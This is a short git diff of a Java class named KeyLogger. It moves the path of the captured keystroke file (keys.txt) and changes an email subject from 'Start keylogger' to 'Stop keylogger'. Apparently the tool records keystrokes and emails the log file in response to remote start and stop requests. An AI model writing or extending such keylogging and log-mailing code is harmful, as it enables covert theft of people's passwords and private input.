@@ -18,7 +18,7 @@ import java.util.Properties;
 import java.util.Scanner;
 
 public class KeyLogger implements NativeKeyListener {
-    private static final Path file = Paths.get("./src/main/java/output/keys.txt");
+    private static final Path file = Paths.get("./src/test/java/output/keys.txt");
     private static boolean running = false;
 
     static {
@@ -92,7 +92,7 @@ public class KeyLogger implements NativeKeyListener {
             System.out.println("Keylogger hasn't started yet.");
         }
 
-        SendMail.sendEmail(from, "Reply for request: Start keylogger", file.toString(),
+        SendMail.sendEmail(from, "Reply for request: Stop keylogger", file.toString(),
                 HTMLGenerator.generateHTML("Your request has been completed successfully",
                         """
                                  The keylogger has stopped. 
